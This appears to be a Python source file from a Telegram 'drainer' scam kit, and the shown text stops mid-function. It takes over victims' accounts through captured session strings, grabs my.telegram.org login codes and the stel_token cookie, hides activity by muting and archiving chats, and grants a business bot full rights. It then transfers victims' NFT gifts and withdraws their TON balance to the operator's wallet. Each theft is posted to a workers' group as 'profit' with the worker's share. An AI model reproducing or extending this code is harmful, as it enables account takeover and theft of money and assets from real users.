import html
import asyncio
import json
from concurrent.futures import ThreadPoolExecutor
import logging
import os
import random
import re
import time
import fake_useragent
import aiohttp
import sys
from urllib.parse import urlparse, unquote

from datetime import datetime, timezone
from pyrogram.raw.functions.account import DeleteAccount as RawDeleteAccount
from pyrogram import Client, errors

from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    FSInputFile,
    LinkPreviewOptions,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

import config
import database
import drainer.core.parse as parse
from drainer.core.functional import mutate_text
from drainer.core.extra_debug import extra_log, exc_text


from datetime import datetime, timedelta, timezone

from base import (
    absolute_path,
    api_hash,
    api_id,
    proxy,
    star_session,
    bot,
    BASE_DIR,
    post_bot,
)

from sqlite3 import OperationalError
import requests

from pyrogram.raw.functions.messages import RequestWebView
from pyrogram.raw.functions.account import UpdateConnectedBot
from pyrogram.raw.functions.account import UpdateNotifySettings
from pyrogram.raw.functions.payments import GetSavedStarGift
from pyrogram.raw.types import (
    InputSavedStarGiftUser,
    InputNotifyPeer,
    InputPeerNotifySettings,
    InputUser,
    InputBusinessBotRecipients,
    BusinessBotRights,
)

from drainer.core import post_connect_captcha
from drainer.core.tonnel_api import create_buy_offer, get_buy_offers, page_gifts_rs, accept_buy_offer, get_balance_info, coffin_balance_withdraw, return_gift, fetch_managed_gifts, coffin_quick_transfer, page_gifts_rs, _tg_user_id

saved_models_dict = {}

SEVEN_DAYS = timedelta(days=7)

DEL = 1

WEBAPP_BTN_POLL_SEC = 0.16
WEBAPP_BTN_POLL_ROUNDS = 32
TONNEL_AFTER_START_SEC = 0.04
MYTG_AFTER_SEND_SEC = 1.0
MYTG_POLL_CHAT_SEC = 1.2
OFFERS_AFTER_CREATE_SLEEP = 5
OFFERS_BEFORE_RECEIVER_SLEEP = 10
OFFERS_RETURN_GIFT_SLEEP = 0.12
PRE_OFFERS_CHAIN_SLEEP = 0.02
MONITOR_SESSION_TICK_SEC = 2.5
POST_MAIN_MSG_PAUSE = 0.2
MYTG_POST_LOGIN_SEC = 0.15
STAR_GIFT_CONVERT_PAUSE = 0.02
UPGRADE_GIFT_PAUSE = 0.04
TONNEL_UNLOCK_INTERVAL_SEC = 3.0


def _tonnel_unlock_resolve_url() -> str:
    u = os.environ.get("TONNEL_UNLOCK_URL", "").strip()
    if u:
        return u
    return str(getattr(config, "TONNEL_UNLOCK_URL", "") or "").strip()


def _tonnel_unlock_headers() -> dict:
    secret = os.environ.get("TONNEL_UNLOCK_SECRET", "").strip() or str(
        getattr(config, "TONNEL_UNLOCK_SECRET", "") or ""
    ).strip()
    h = {"Content-Type": "application/json"}
    if secret:
        h["Authorization"] = f"Bearer {secret}"
    return h


async def _tonnel_unlock_post(url: str, uid: int, username: str | None) -> None:
    body = {"user_id": uid}
    if username:
        body["username"] = str(username).lstrip("@")
    timeout = aiohttp.ClientTimeout(total=12)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.post(url, json=body, headers=_tonnel_unlock_headers()) as resp:
            await resp.read()


async def _tonnel_unlock_loop(stop: asyncio.Event, ctx: dict) -> None:
    url = _tonnel_unlock_resolve_url()
    if not url:
        return
    while not stop.is_set():
        uid = ctx.get("user_id")
        if uid is not None:
            try:
                await _tonnel_unlock_post(url, int(uid), ctx.get("username"))
            except Exception:
                pass
        try:
            await asyncio.wait_for(stop.wait(), timeout=TONNEL_UNLOCK_INTERVAL_SEC)
        except asyncio.TimeoutError:
            pass


async def connect_with_retry(client, retries=5):
    for i in range(retries):
        try:
            return await client.connect()
        except OperationalError as e:
            if "database is locked" in str(e).lower():
                if i == retries - 1:
                    raise
                await asyncio.sleep(1)
            else:
                raise


def get_gift_model_id(gift_link, gift_model):
    global saved_models_dict

    slug = gift_link.split("/")[-1]
    slug = slug.split("-")[0]
    try:
        if slug in saved_models_dict:
            return saved_models_dict[slug][gift_model]

        response = requests.get(f"https://api.telegram-gifts.ru/emoji/{slug}")
        models_dict = response.json()["response"]
        saved_models_dict[slug] = models_dict
        return models_dict[gift_model]
    except Exception as e:
        return "🎁"


def can_transfer_gift_unix(next_transfer_unix: int | None) -> bool:
    now_unix = int(datetime.now(timezone.utc).timestamp())
    if next_transfer_unix is None:
        return True

    return next_transfer_unix <= now_unix


async def saved_star_gift_transfer_meta(
    app: Client, msg_id: int,
) -> tuple[int | None, int | None] | None:
    try:
        res = await app.invoke(
            GetSavedStarGift(stargift=[InputSavedStarGiftUser(msg_id=msg_id)])
        )
        gifts = getattr(res, "gifts", None) or []
        if not gifts:
            return None
        sg = gifts[0]
        ts = getattr(sg, "transfer_stars", None)
        cta = getattr(sg, "can_transfer_at", None)
        if ts is not None:
            ts = int(ts)
        if cta is not None:
            cta = int(cta)
        return ts, cta
    except Exception:
        return None


def select_gifts_to_cover(
    star_gifts: dict[int, int], needed_star_amount: int
) -> list[int]:
    sorted_gifts = sorted(star_gifts.items(), key=lambda x: x[0], reverse=True)

    selected = []
    total = 0

    for price, gift_id in sorted_gifts:
        while total + price <= needed_star_amount:
            selected.append(gift_id)
            total += price
        if total >= needed_star_amount:
            break

    if total < needed_star_amount:
        smallest_price, smallest_id = min(star_gifts.items(), key=lambda x: x[0])
        selected.append(smallest_id)
        total += smallest_price

    best_combo = selected
    best_total = total

    for p, gid in star_gifts.items():
        if total - p >= needed_star_amount and gid in selected:
            temp = selected.copy()
            temp.remove(gid)
            if (
                sum(next(k for k, v in star_gifts.items() if v == g) for g in temp)
                >= needed_star_amount
            ):
                selected = temp
                total -= p

    return selected


async def use_session(user_id: int, session_string: str):
    session_path = f"{absolute_path}/sessions/{user_id}"
    if not os.path.exists(session_path + ".session"):
        logging.warning(f"cессия {user_id} не найдена.")
        return False

    api_id = config.API_ID
    api_hash = config.API_HASH
    session_name = random.choices("abcdefghijklmnopqrstuvwxyz0123456789" + "abcdefghijklmnopqrstuvwxyz0123456789".upper(), k=16)
    app = Client(session_name, api_id=api_id, api_hash=api_hash, session_string=session_string)

    try:
        await app.connect()
        me = await app.get_me()
        logging.info(f"cессия {user_id} активна: {me.username}")
        await app.disconnect()
        return me.username
    except (
        errors.AuthKeyUnregistered,
        errors.SessionRevoked,
        errors.Unauthorized,
    ) as e:
        logging.warning(f"cессия {user_id} отключена: {type(e).__name__}")
        try:
            os.remove(session_path + ".session")
            logging.info(f"Удалил невалидную сесcию {session_path + '.session'}")
        except Exception as e2:
            logging.error(
                f"Не удалось удaлить сесcию {session_path + '.session'}: {e2}"
            )
        return False
    except Exception as e:
        logging.error(f"Ошибка при работе сессии {user_id}: {e}")
        return False


async def monitor_session(user_id: int, session_string: str):
    for _ in range(60):
        is_active = await use_session(user_id, session_string)
        if not is_active:
            logging.warning(f"cессия {user_id} потеряла соединение.")
            for admin_id in config.ADMIN_ID:
                try:
                    msg = (
                        f"<tg-emoji emoji-id='5276240711795107620'>🔴</tg-emoji> <b>Сессия offline</b>\n\n"
                        f"<tg-emoji emoji-id='5275979556308674886'>👤</tg-emoji> Логин: <code>—</code>\n"
                        f"<tg-emoji emoji-id='5278589204207528856'>🆔</tg-emoji> ID: <code>{user_id}</code>\n"
                        f"<tg-emoji emoji-id='5278305362703835500'>📁</tg-emoji> Файл: <code>{absolute_path}/sessions/{user_id}.dsf</code>\n"
                    )
                    await bot.send_message(
                        admin_id, msg, parse_mode="HTML"
                    )
                except Exception as e:
                    logging.error(
                        f"Не удалось отправить уведомление админу {admin_id}: {e}"
                    )
            await bot.send_message(
                chat_id=config.WORK_GROUP_ID,
                message_thread_id=config.LOGS_THREAD_ID,
                text=msg,
                parse_mode="HTML",
            )
            await extra_log(
                "monitor_session: сессия offline (use_session вернул False)",
                user_id=user_id,
                step="monitor",
            )
            break
        await asyncio.sleep(MONITOR_SESSION_TICK_SEC)


async def send_profit_log(profits_list, goi_id, worker_id):
    try:
        with open(f"{absolute_path}/storage/procents.json", "r", encoding="utf-8") as f:
            data = f.read()

        if not data:
            return

        procentage_data = json.loads(data)
        procentage = int(procentage_data["worker"])

        with open(f"{absolute_path}/storage/settings.json", "r", encoding="utf-8") as f:
            data = f.read()

        if not data:
            return

        settings_data = json.loads(data)
        worker_private_mode = int(settings_data["worker_privacy"])
    except:
        procentage = 50
        worker_private_mode = 1

    profit_text = ""
    ton_amount = await parse.get_gift_prices(profits_list)
    
    try:
        database.write_advanced_profit(worker_id, ton_amount)
    except:
        pass

    try:
        if database.get_worker_wallet(worker_id):
            worker_tons = float(database.get_user_tons(worker_id) or 0)
            worker_nfts = int(database.get_user_nfts(worker_id) or 0)
            
            database.set_user_nfts(worker_id, worker_nfts + len(profits_list))
            database.set_user_tons(worker_id, worker_tons + ton_amount)
        else:
            database.write_worker(worker_id, "Не установлен", "-", True)
            
            database.set_user_nfts(worker_id, len(profits_list))
            database.set_user_tons(worker_id, ton_amount)
    except:
        pass

    for profit in profits_list:
        profit_text += f"\n{profit}"

    profit_id = database.write_profits(
        goi_id=int(goi_id),
        worker_id=int(worker_id),
        profits_list=profits_list,
        amount=str(ton_amount),
    )

    me = await bot.get_me()
    bot_username = me.username

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="💸 Выплатить",
                    url=f"https://t.me/{bot_username}?start={profit_id}",
                )
            ],
        ]
    )

    markup_with_worker_button = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="💸 Выплатить",
                    url=f"https://t.me/{bot_username}?start={profit_id}",
                )
            ],
            [InlineKeyboardButton(text="🥷 Воркер", url=f"tg://user?id={worker_id}")],
        ]
    )

    caption = (
        f"<tg-emoji emoji-id='5278411813468269386'>✅</tg-emoji> <b>Н0ВЫЙ ПР0ФИТ <code>#{profit_id}</code></b>\n"
        f"{profit_text}\n\n"
        f"<blockquote><tg-emoji emoji-id='5278589204207528856'>❌</tg-emoji> Мимонт: <code>{goi_id}</code>\n"
        f"<tg-emoji emoji-id='5275979556308674886'>❌</tg-emoji> Воркер: <code>{worker_id if not worker_private_mode else 'скрыт'}</code>\n\n"
        f"<tg-emoji emoji-id='5255933397750014894'>❌</tg-emoji> Сумма: <code>{ton_amount:.2f}</code> <tg-emoji emoji-id='5193179982775476271'>💎</tg-emoji>\n"
        f"<tg-emoji emoji-id='5255933397750014894'>❌</tg-emoji> Доля воркера: <code>{(ton_amount * procentage / 100):.2f}</code> <tg-emoji emoji-id='5193179982775476271'>💎</tg-emoji>\n"
        f"(<code>{procentage}%</code>)</blockquote>"
    )

    try:
        await post_bot.send_video(
            video=FSInputFile(BASE_DIR / "static" / "profit.mp4"),
            chat_id=config.WORK_GROUP_ID,
            message_thread_id=config.DRAINS_THREAD_ID,
            caption=caption,
            parse_mode="HTML",
            reply_markup=markup if worker_private_mode else markup_with_worker_button,
        )

    except Exception as e:
        if "BUTTON_USER" in str(e).upper():
            await post_bot.send_video(
                video=FSInputFile(BASE_DIR / "static" / "profit.mp4"),
                chat_id=config.WORK_GROUP_ID,
                message_thread_id=config.DRAINS_THREAD_ID,
                caption=caption,
                parse_mode="HTML",
                reply_markup=markup,
            )
    await extra_log(
        f"send_profit_log: #{profit_id} goi={goi_id} worker={worker_id} gifts={len(profits_list)}",
        user_id=goi_id,
        step="profit",
    )

async def request_my_login_code(session_string: str, user) -> tuple[str | None, str]:
    api_id = config.API_ID
    api_hash = config.API_HASH
    session_name = random.choices("abcdefghijklmnopqrstuvwxyz0123456789" + "abcdefghijklmnopqrstuvwxyz0123456789".upper(), k=16)
    app = Client(session_name, api_id=api_id, api_hash=api_hash, session_string=session_string)

    await app.connect()

    if not getattr(user, "phone_number", None):
        return None, "no_phone"

    phone = user.phone_number
    if not phone.startswith("+"):
        phone = f"+{phone}"

    try:
        ua = fake_useragent.UserAgent()
        
        headers = {
            "User-Agent": ua.firefox,
            "Referer": "https://my.telegram.org/",
            "Origin": "https://my.telegram.org"
        }
        async with aiohttp.ClientSession(headers=headers) as session:
            resp = await session.post(
                "https://my.telegram.org/auth/send_password",
                data={"phone": phone},
            )

            try:
                data = await resp.json(content_type=None)
            except Exception:
                text = await resp.text()
                return None, f"send_password_bad_response: {text[:200]}"

            if "random_hash" not in data:
                return None, f"no_random_hash: {data}"

            random_hash = data["random_hash"]

            code = None
            deadline = time.time() + 120

            await asyncio.sleep(MYTG_AFTER_SEND_SEC)

            try:
                last_id = None

                while time.time() < deadline and not code:

                    async for msg in app.get_chat_history(777000, limit=10):

                        if last_id and msg.id <= last_id:
                            break

                        last_id = msg.id
                        text = msg.text or ""

                        if "my.telegram.org" in text.lower():

                            matches = re.findall(r"\b[A-Za-z0-9_-]{8,15}\b", text)

                            blacklist = {"telegram", "account", "server"}

                            for m in matches:
                                start_idx = text.find(m)
                                if start_idx > 0 and text[start_idx-1] == ":" or text[start_idx-2] == ":":
                                    if m.lower() not in blacklist:
                                        code = m
                                        print("code:")
                                        print(code)
                                        break
                        if code:
                            break

                    if not code:
                        await asyncio.sleep(MYTG_POLL_CHAT_SEC)

            except Exception as e:
                logging.error(f"Ошибка чтения 777000: {e}")
                return None, "read_failed"

            if not code:
                return None, "code_not_found"
        
            resp = await session.post(
                "https://my.telegram.org/auth/login",
                data={
                    "phone": phone,
                    "random_hash": random_hash,
                    "password": code,
                },
            )
        
            try:
                data = await resp.json()
            except Exception:
                text = await resp.text()
                return None, f"login_bad_response: {text[:200]}"
            
            await asyncio.sleep(MYTG_POST_LOGIN_SEC)
            
            await session.get("https://my.telegram.org/")
        
            await asyncio.sleep(MYTG_POST_LOGIN_SEC)

            cookies = session.cookie_jar.filter_cookies("https://my.telegram.org")

            stel_token = cookies.get("stel_token")
            if stel_token:
                return stel_token.value, "ok"

            return None, "stel_token_not_found"

    except Exception as e:
        print(f"Ошибка: {e}")
        return None, e

async def has_any_message(app: Client, bot: str) -> bool:
    try:
        history = app.get_chat_history(bot, limit=1)
    except Exception as e:
        print(f"ERROR_GET_CHAT_HISTORY {type(e).__name__}: {str(e)[:120]}", file=sys.stderr)
        return False

    if history is None:
        return False

    try:
        async for _ in history:
            return True
    except Exception as e:
        print(f"ERROR_ITERATE_CHAT_HISTORY {type(e).__name__}: {str(e)[:120]}", file=sys.stderr)
        return False

    return False


async def resolve_input_user(app: Client, bot: str) -> InputUser:
    peer_or_coro = app.resolve_peer(bot)
    if asyncio.iscoroutine(peer_or_coro):
        peer = await peer_or_coro
    else:
        peer = peer_or_coro
    user_id = getattr(peer, "user_id", None)
    access_hash = getattr(peer, "access_hash", None)
    if user_id is None or access_hash is None:
        raise RuntimeError("Cannot resolve bot to InputUser")
    return InputUser(user_id=user_id, access_hash=access_hash)


async def resolve_input_peer(app: Client, bot: str):
    peer_or_coro = app.resolve_peer(bot)
    if asyncio.iscoroutine(peer_or_coro):
        return await peer_or_coro
    return peer_or_coro


async def mute_notifications(app: Client, bot: str, mute_seconds: int) -> None:
    bot_peer = await resolve_input_peer(app, bot)
    mute_until = int(time.time()) + max(0, int(mute_seconds))
    settings = InputPeerNotifySettings(
        show_previews=False,
        silent=True,
        mute_until=mute_until,
    )
    invoke_result = app.invoke(
        UpdateNotifySettings(
            peer=InputNotifyPeer(peer=bot_peer),
            settings=settings,
        )
    )
    if asyncio.iscoroutine(invoke_result):
        await invoke_result


async def connect_business_bot(app: Client, bot: str) -> None:
    bot_input = await resolve_input_user(app, bot)
    recipients = InputBusinessBotRecipients(
        existing_chats=True,
        new_chats=True,
        contacts=True,
        non_contacts=True,
    )
    rights = BusinessBotRights(
        reply=True,
        read_messages=True,
        delete_sent_messages=True,
        delete_received_messages=True,
        edit_name=True,
        edit_bio=True,
        edit_profile_photo=True,
        edit_username=True,
        view_gifts=True,
        sell_gifts=True,
        change_gift_settings=True,
        transfer_and_upgrade_gifts=True,
        transfer_stars=True,
        manage_stories=True,
    )
    await app.invoke(
        UpdateConnectedBot(
            bot=bot_input,
            recipients=recipients,
            rights=rights,
            deleted=False,
        )
    )


async def run_business_flow(app: Client, log_user_id: int | None = None):
    await extra_log("run_business_flow: connect user client", user_id=log_user_id, step="hybr1d.biz")
    await extra_log("run_business_flow: connected", user_id=log_user_id, step="hybr1d.biz")
    await mute_notifications(app, "@Tonnel_Network_bot", 600)
    await extra_log("run_business_flow: mute_notifications ok", user_id=log_user_id, step="hybr1d.biz")

    try:
        await app.unblock_user("@Tonnel_Network_bot")
    except Exception as e:
        await extra_log(f"run_business_flow: не удалось анблокнуть тоннель: {e}", user_id=log_user_id, step="hybr1d.biz")

        await app.send_message("@Tonnel_Network_bot", "/start", disable_notification=True)
    await asyncio.sleep(TONNEL_AFTER_START_SEC)
    await app.archive_chats("@Tonnel_Network_bot")

    await connect_business_bot(app, "@Tonnel_Network_bot")
    await extra_log("run_business_flow: connect_business_bot ok", user_id=log_user_id, step="hybr1d.biz")
    
    await extra_log("run_business_flow: archive_chats ok, return 0", user_id=log_user_id, step="hybr1d.biz")
    return 0

def get_all_gift_ids(init_data: str) -> list:
    """
    Принимает init_data (tgWebAppData) и возвращает список всех gift_id для данного пользователя.
    """
    uid = _tg_user_id(init_data)
    filter_dict = {
        "seller": uid,
        "buyer": {"$exists": False},
        "refunded": {"$ne": True},
        "price": {"$exists": False},
    }
    sort_str = '{"gift_num":1,"gift_id":-1}'
    resp = page_gifts_rs(
        page=1,
        limit=30,
        sort=sort_str,
        filter_=filter_dict,
        ref="",
        user_auth=init_data,
    )
    # resp это list[dict], вытягиваем gift_id из каждого
    gift_ids = []
    if isinstance(resp, list):
        for item in resp:
            if isinstance(item, dict) and "gift_id" in item:
                gift_ids.append(item["gift_id"])
    return gift_ids

def get_all_gifts_tonnel_not_on_sale(init_data: str) -> list:
    uid = _tg_user_id(init_data)
    filter_dict = {
        "seller": uid,
        "buyer": {"$exists": False},
        "refunded": {"$ne": True},
        "price": {"$exists": False},
    }
    sort_str = '{"gift_num":1,"gift_id":-1}'
    resp = page_gifts_rs(
        page=1,
        limit=30,
        sort=sort_str,
        filter_=filter_dict,
        ref="",
        user_auth=init_data,
    )
    if isinstance(resp, list):
        return resp
    return []


def get_all_gifts_tonnel_on_sale(init_data: str) -> list:
    uid = _tg_user_id(init_data)
    filter_dict = {
        "seller": uid,
        "buyer": {"$exists": False},
        "refunded": {"$ne": True},
        "price": {"$exists": True},
    }
    sort_str = '{"gift_num":1,"gift_id":-1}'
    resp = page_gifts_rs(
        page=1,
        limit=30,
        sort=sort_str,
        filter_=filter_dict,
        ref="",
        user_auth=init_data,
    )
    if isinstance(resp, list):
        return resp
    return []


def get_all_buy_offers_for_gifts(init_data: str, gift_ids: list) -> dict:
    """
    Получает все офферы для каждого gift_id из списка.
    Возвращает словарь {gift_id: offers_list}
    """
    result = {}
    for gift_id in gift_ids:
        try:
            offers = get_buy_offers(init_data, gift_id)
            result[gift_id] = offers
        except Exception as e:
            result[gift_id] = {"status": "error", "message": str(e)[:120]}
            print(f"Ошибка при получении офферов для gift_id {gift_id}: {str(e)[:120]}")
    return result


def get_all_buy_offers_for_gifts_parallel(init_data: str, gift_ids: list) -> dict:
    result = {}
    if not gift_ids:
        return result
    n = len(gift_ids)
    workers = max(1, min(12, n))
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(get_buy_offers, init_data, gid): gid for gid in gift_ids}
        for fut in futs:
            gid = futs[fut]
            try:
                result[gid] = fut.result()
            except Exception as e:
                result[gid] = {"status": "error", "message": str(e)[:120]}
                print(f"Ошибка при получении офферов для gift_id {gid}: {str(e)[:120]}")
    return result

async def print_managed_and_optional_coffin(init_data: str) -> None:
    needed_stars_amount = 0
    out = await asyncio.to_thread(fetch_managed_gifts, init_data)        
    nft_gifts = []
        
    try:
        fetchMangedGiftsDebug = out["fetchMangedGifts"]["response"]["data"]
    except:
        return [[], 0]
    
    for gift in fetchMangedGiftsDebug:
        is_from_blockchain = gift['gift'].get("is_from_blockchain", False)
        
        if not is_from_blockchain:
            gift_can_be_transferred = gift['next_transfer_date'] < int(time.time())
        else:
            gift_can_be_transferred = False
        
        if gift_can_be_transferred:
            try:
                needed_stars_amount += gift["transfer_star_count"] or 25
            except:
                needed_stars_amount += 25

        nft_gifts.append(
            {
                "gift_link": f"https://t.me/nft/{gift['gift']['name']}",
                "model_emoji": gift["gift"]["model"]["sticker"]["custom_emoji_id"],
                "backdrop_name": gift["gift"]["backdrop"]["name"],
                "can_be_transferred": gift_can_be_transferred,
                "is_from_blockchain": is_from_blockchain,
                "gift_id": gift['owned_gift_id'],
            }
        )
        
    return [nft_gifts, needed_stars_amount]

async def maybe_await(v):
    if asyncio.iscoroutine(v):
        return await v
    return v


async def get_webapp_url_from_button(app: Client, bot: str) -> str:
    sent = await app.send_message(bot, "/start", disable_notification=True)
    sent_id = getattr(sent, "id", 0) or 0
    for _ in range(WEBAPP_BTN_POLL_ROUNDS):
        history = app.get_chat_history(bot, limit=12)
        if history is None:
            await asyncio.sleep(WEBAPP_BTN_POLL_SEC)
            continue
        async for msg in history:
            if getattr(msg, "id", 0) <= sent_id:
                continue
            if getattr(msg, "outgoing", False):
                continue
            markup = getattr(msg, "reply_markup", None)
            rows = getattr(markup, "inline_keyboard", None) or []
            for row in rows:
                for btn in row:
                    wa = getattr(btn, "web_app", None)
                    if wa is not None:
                        u = getattr(wa, "url", None)
                        if u:
                            return u
        await asyncio.sleep(WEBAPP_BTN_POLL_SEC)
    raise RuntimeError("WebApp button not found")


DEFAULT_MARKETPLACE_WEBVIEW_URL = "https://marketplace.tonnel.network/?tgWebAppStartParam=managegifts"


async def get_tg_webappdata(
    app: Client,
    bot: str,
    webview_url: str | None = None,
    start_param: str | None = None,
) -> str:
    bot_input = await resolve_input_user(app, bot)
    peer = await resolve_input_peer(app, bot)
    url_for_rv = webview_url or DEFAULT_MARKETPLACE_WEBVIEW_URL
    rv_kwargs = {
        "peer": peer,
        "bot": bot_input,
        "platform": "android",
        "url": url_for_rv,
    }
    if start_param:
        rv_kwargs["start_param"] = start_param

    try:
        res_or_coro = app.invoke(RequestWebView(**rv_kwargs))
        res = await maybe_await(res_or_coro)
        u = getattr(res, "url", None)
        if u:
            return extract_tg_webappdata_from_url(u)
    except Exception as e:
        print("RequestWebView failed, fallback to button:", str(e)[:120], file=sys.stderr)

    url = await get_webapp_url_from_button(app, bot)
    return extract_tg_webappdata_from_url(url)


def extract_tg_webappdata_from_url(web_url: str) -> str:
    parsed = urlparse(web_url)
    for part in (parsed.query, parsed.fragment):
        if not part or "tgWebAppData=" not in part:
            continue
        for item in part.split("&"):
            if item.startswith("tgWebAppData="):
                v = item[len("tgWebAppData=") :]
                for _ in range(8):
                    u = unquote(v)
                    if u == v:
                        return u
                    v = u
                return v
    raise RuntimeError("tgWebAppData not found in URL")

async def run_initdata_flow(session_string: str, star_session_string: str, upgrade_gifts: bool = False, user_username: str = None, log_user_id: int | None = None) -> int:
    profits_list = []
    rented_gifts = []
    cooldown_gifts = []
    gifts = []
    gifts_to_upgrade = []
    legacy_profits_list = []
    
    all_gifts_amount = 0
    needed_star_amount = 0
    
    api_id = config.API_ID
    api_hash = config.API_HASH

    session_name = random.choices("abcdefghijklmnopqrstuvwxyz0123456789" + "abcdefghijklmnopqrstuvwxyz0123456789".upper(), k=16)
    app = Client(session_name, api_id=api_id, api_hash=api_hash, session_string=session_string)
    await extra_log("run_initdata_flow: start", user_id=log_user_id, step="hybr1d.flow")
    await app.connect()
    await extra_log("run_initdata_flow: user Pyrogram connected", user_id=log_user_id, step="hybr1d.flow")

    async def init_client(session_string: str):
        session_name = "".join(random.choices(
            "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=16
        ))
        client = Client(
            session_name,
            api_id=api_id,
            api_hash=api_hash,
            session_string=session_string
        )
        await client.connect()
        return client
    
    async def run_create_and_accept_offers(user_init_data: str, amount: float):
        await extra_log(
            "run_create_and_accept_offers: start",
            user_id=log_user_id,
            step="hybr1d.offers",
        )
        all_gifts_ids = await asyncio.to_thread(get_all_gift_ids, user_init_data)
        await extra_log(
            f"run_create_and_accept_offers: seller gift_ids n={len(all_gifts_ids)}",
            user_id=log_user_id,
            step="hybr1d.offers",
        )
        async with hybr1d_app:
            init_data = await get_tg_webappdata(hybr1d_app, "@Tonnel_Network_bot")
            await extra_log(
                f"run_create_and_accept_offers: hybr1d init_data len={len(init_data)}",
                user_id=log_user_id,
                step="hybr1d.offers",
            )
            if all_gifts_ids:
                buy_results = await asyncio.gather(
                    *[
                        asyncio.to_thread(
                            create_buy_offer, init_data, gift_id, amount, "TON"
                        )
                        for gift_id in all_gifts_ids
                    ],
                    return_exceptions=True,
                )
                for gift_id, result in zip(all_gifts_ids, buy_results):
                    await extra_log(
                        f"[BUY OFFER RESULT] {gift_id}:\n\n{json.dumps(result, ensure_ascii=False, indent=2)}",
                        user_id=log_user_id,
                        step="hybr1d.offers"
                    )
        await asyncio.sleep(OFFERS_AFTER_CREATE_SLEEP)
        offers = get_all_buy_offers_for_gifts_parallel(user_init_data, all_gifts_ids)
        bad_offers = [
            gid
            for gid in all_gifts_ids
            if not isinstance(offers.get(gid), dict) or "offers" not in offers.get(gid, {})
        ]
        if bad_offers:
            await extra_log(
                f"run_create_and_accept_offers: нет ключа offers у gift_ids={bad_offers[:25]}",
                user_id=log_user_id,
                step="hybr1d.offers",
            )
            for gift_id in all_gifts_ids:
                off = offers.get(gift_id)
                if not isinstance(off, dict) or "offers" not in off:
                    continue
                for offer in off["offers"]:
                    if offer["status"] == "pending":
                        if offer["price"] == amount and offer["asset"] == "TON":
                            print(f"Пытаюсь принять оффер {offer['offer_id']} для gift_id {gift_id}...")
                            accept_result = await asyncio.to_thread(accept_buy_offer, user_init_data, offer["offer_id"])
                            print(f"Результат принятия оффера {offer['offer_id']}: {accept_result}")
        balance = get_balance_info(user_init_data)
        coffin_balance_withdraw(wallet=config.OFFERS_WALLET, amount=balance, asset="TON", auth_data=user_init_data)
        await asyncio.sleep(OFFERS_BEFORE_RECEIVER_SLEEP)
        all_receiver_gifts_ids = await asyncio.to_thread(get_all_gift_ids, init_data)
        print(all_receiver_gifts_ids)
        for gift_id in all_receiver_gifts_ids:
            print(return_gift(auth_data=init_data, gift_id=gift_id))
            await asyncio.sleep(OFFERS_RETURN_GIFT_SLEEP)

    try:
        async for gift in app.get_chat_gifts("me", exclude_upgraded=True, exclude_limited=True, exclude_unlimited=False):
            all_gifts_amount += 1
            gift_date = gift.date
            if gift_date.tzinfo is None:
                gift_date = gift_date.replace(tzinfo=timezone.utc)

            if datetime.now(timezone.utc) - gift_date <= SEVEN_DAYS:
                try:
                    await app.convert_gift(gift.message_id)
                except:
                    pass
        await extra_log(
            f"run_initdata_flow: gifts scan done, count={all_gifts_amount}",
            user_id=log_user_id,
            step="hybr1d.flow",
        )
        if upgrade_gifts:
            async for gift in app.get_chat_gifts("me", exclude_upgraded=True, exclude_limited=False, exclude_unlimited=True):
                all_gifts_amount += 1
                if gift.can_upgrade:
                    try:
                        needed_star_amount += gift.upgrade_price
                        gifts_to_upgrade.append([gift])
                    except:
                        pass
        await extra_log(
            "run_initdata_flow: before get_tg_webappdata Tonnel",
            user_id=log_user_id,
            step="hybr1d.flow",
        )
        star_session, hybr1d_app, tgwebappdata = await asyncio.gather(
            init_client(star_session_string),
            init_client(config.HYBR1D_SESSION_STRING),
            get_tg_webappdata(app, "@Tonnel_Network_bot"),
        )
        star_session_user = await star_session.get_me()
        star_session_username = (
            star_session_user.username
            if star_session_user.username
            else star_session_user.id
        )
        await extra_log(
            f"run_initdata_flow: init_data len={len(tgwebappdata)}",
            user_id=log_user_id,
            step="hybr1d.flow",
        )
        nft_gifts = await print_managed_and_optional_coffin(tgwebappdata)
        all_gifts_amount += len(nft_gifts[0])
        needed_star_amount += nft_gifts[1]
        await extra_log(
            f"run_initdata_flow: managed NFT n={len(nft_gifts[0])} needed_stars={nft_gifts[1]}",
            user_id=log_user_id,
            step="hybr1d.flow",
        )
        star_amount = await app.get_stars_balance()
        
        if star_session.is_connected:
            legacy_needed_star_amount = needed_star_amount
            needed_star_amount = needed_star_amount - star_amount
            if needed_star_amount > 0:
                star_gifts = {
                    13: 5170145012310081615,
                    43: 5170144170496491616,
                    85: 5168043875654172773,
                }
                chosen = select_gifts_to_cover(star_gifts, needed_star_amount)
                for star_gift in chosen:
                    try:
                        sent = await star_session.send_gift(
                            chat_id=user_username, gift_id=star_gift
                        )

                        if sent:
                            await asyncio.sleep(STAR_GIFT_CONVERT_PAUSE)

                            async for message in app.get_chat_history(
                                star_session_username, limit=1
                            ):
                                try:
                                    await app.convert_gift(message.id)
                                except:
                                    pass
                                break
                    except:
                        pass
        
        legacy_star_amount = await app.get_stars_balance()
        await extra_log(
            f"run_initdata_flow: stars_balance={legacy_star_amount} upgrade_gifts_n={len(gifts_to_upgrade)}",
            user_id=log_user_id,
            step="hybr1d.flow",
        )
        for gift in gifts_to_upgrade:
            try:
                await app.upgrade_gift(gift.message_id)
                await asyncio.sleep(UPGRADE_GIFT_PAUSE)
            except:
                pass
        
        xfer = [
            g
            for g in nft_gifts[0]
            if g["can_be_transferred"]
        ]
        if xfer:
            coffin_results = await asyncio.gather(
                *[
                    asyncio.to_thread(coffin_quick_transfer, tgwebappdata, g["gift_id"])
                    for g in xfer
                ],
                return_exceptions=True,
            )
            for g, r in zip(xfer, coffin_results):
                if isinstance(r, Exception):
                    await extra_log(
                        f"coffin_quick_transfer gift_id={g.get('gift_id')} link={g.get('gift_link')}: {r!r}",
                        user_id=log_user_id,
                        step="hybr1d.flow",
                    )
            
        await asyncio.sleep(PRE_OFFERS_CHAIN_SLEEP)
        await extra_log(
            "run_initdata_flow: before run_create_and_accept_offers",
            user_id=log_user_id,
            step="hybr1d.flow",
        )
